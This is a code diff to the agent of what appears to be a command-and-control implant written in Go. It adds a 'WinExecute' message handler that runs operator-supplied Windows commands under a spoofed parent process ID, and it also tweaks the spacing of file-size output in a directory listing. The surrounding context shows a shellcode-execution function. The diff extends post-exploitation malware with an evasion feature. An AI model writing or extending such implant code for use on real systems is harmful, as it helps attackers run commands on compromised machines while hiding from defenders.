@@ -767,6 +767,10 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 		p := m.Payload.(messages.CmdPayload)
 		c.Job = p.Job
 		c.Stdout, c.Stderr = a.executeCommand(p)
+    case "WinExecute":
+        p := m.Payload.(messages.WinExecute)
+        c.Job = p.Job
+        c.Stdout, c.Stderr = a.winExecute(p)
 	case "ServerOk":
 		if a.Verbose {
 			message("note", "Received Server OK, doing nothing")
@@ -1038,6 +1042,30 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 	return stdout, stderr
 }
 
+func (a *Agent) winExecute(j messages.WinExecute) (stdout string, stderr string) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for winExecute function: %s", j))
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("Executing windowscommand %s %s with ppid %s", j.Command, j.Args, j.Ppid))
+	}
+
+	stdout, stderr = WinExec(j.Command, j.Args, j.Ppid)
+
+	if a.Verbose {
+		if stderr != "" {
+			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
+			message("success", stdout)
+			message("warn", fmt.Sprintf("Error: %s", stderr))
+
+		} else {
+			message("success", stdout)
+		}
+	}
+
+	return stdout, stderr
+
+}
+
 func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 
 	if a.Debug {
@@ -1144,7 +1172,7 @@ func (a *Agent) list(path string) (string, error) {
 
 	for _, f := range files {
 		perms := f.Mode().String()
-		size := strconv.FormatInt(f.Size(), 10)
+        size := fmt.Sprintf("%-15s", strconv.FormatInt(f.Size(), 10))
 		modTime := f.ModTime().String()[0:19]
 		name := f.Name()
 		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
